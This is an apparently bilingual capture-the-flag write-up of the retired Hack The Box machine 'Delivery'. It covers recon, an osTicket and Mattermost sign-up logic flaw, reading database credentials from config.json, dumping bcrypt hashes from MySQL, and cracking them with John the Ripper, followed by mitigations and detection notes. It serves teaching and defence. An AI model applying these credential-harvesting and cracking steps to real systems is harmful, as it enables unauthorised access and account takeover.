---
machine: Delivery
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, osticket, mattermost, logic-flaw, bcrypt]
---

# Delivery — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Two legitimate applications badly combined: osTicket and Mattermost. osTicket hands an `@delivery.htb` address to anyone opening a guest ticket, and Mattermost requires exactly that domain to sign up. The verification email lands in the ticket thread, so an account can be created without owning a mailbox. Inside, the internal channel leaks credentials and a password hint; `root`'s bcrypt hash falls to rules, and `su root` finishes the box.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 7.9p1 Debian 10
80/tcp    http  nginx 1.14.2
8065/tcp  http  Mattermost
```

```bash
echo "<IP> delivery.htb helpdesk.delivery.htb" | sudo tee -a /etc/hosts
```

The landing HTML mentions both hostnames and says an `@delivery.htb` address grants Mattermost access.

## Enumeration

```bash
gobuster dir -u http://delivery.htb/ -w /usr/share/wordlists/dirb/common.txt -t 40
```

Only static content (`/index.html`, `/images`, `/assets`). The vhosts matter:

- `helpdesk.delivery.htb` → osTicket, guest tickets allowed.
- `delivery.htb:8065` → Mattermost, registration limited to the internal domain.

## Foothold

```text
http://helpdesk.delivery.htb/open.php
Email: anything@external.tld
```

Creating the ticket assigns `TICKETID@delivery.htb` as the contact address, and anything sent there shows up in the thread.

```text
http://delivery.htb:8065 → Create Account
Email: <TICKETID>@delivery.htb
```

The verification email arrives; read it in the ticket, click the link, and the account is active. It is a logic flaw: neither application is vulnerable on its own.

The `#internal` channel holds SSH credentials and a hint: the password is a variant of a common word, so attack it with rules.

```bash
ssh maildeliverer@<IP>
```

## Escalation

```bash
cat /opt/mattermost/config/config.json
```

```json
"DataSource": "mmuser:<dbpass>@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4"
```

```bash
mysql -u mmuser -p'<dbpass>' -e "select Username,Password from mattermost.Users"
```

```text
root  $2a$10$...
```

bcrypt with one base word and rules:

```bash
echo 'PleaseSubscribe!' > base.txt
john hash.txt --wordlist=base.txt --rules=best64
```

```bash
su root
```

The channel hint was literal: the password is that word plus a numeric suffix. Without the hint, bcrypt would have taken years.

## Evidence

- Ticket with the internal address and verification email (redacted).
- `whoami` → `maildeliverer`, then `root`.
- `root`'s bcrypt hash (redacted).

## Lessons learned

- Logic flaws between two valid systems need no CVE: one just has to issue identities the other accepts.
- A port outside the top 1000 (8065) was half the challenge; full scans are mandatory.
- An application's `config.json` usually carries database credentials in clear.
- A password hint shrinks bcrypt's search space from centuries to seconds.
- Enumerating users in the internal channel paid more than any exploit.

## Mitigations and detection

- Do not accept verification emails at addresses the system itself gives to guests; validate the domain against the real directory.
- Restrict Mattermost registration to invitations and verify the mailbox out of band.
- Move credentials out of `config.json` into environment variables or a secret manager.
- Long random administrator passwords; bcrypt does not compensate for a dictionary word.
- Detection: guest tickets receiving third-party verification emails, Mattermost sign-ups from the same host, SQL queries against the Mattermost database.
- MITRE: T1078, T1552.001, T1110.002.

## References

- osTicket documentation on ticket email addresses.
- MITRE ATT&CK: T1078, T1552.001.
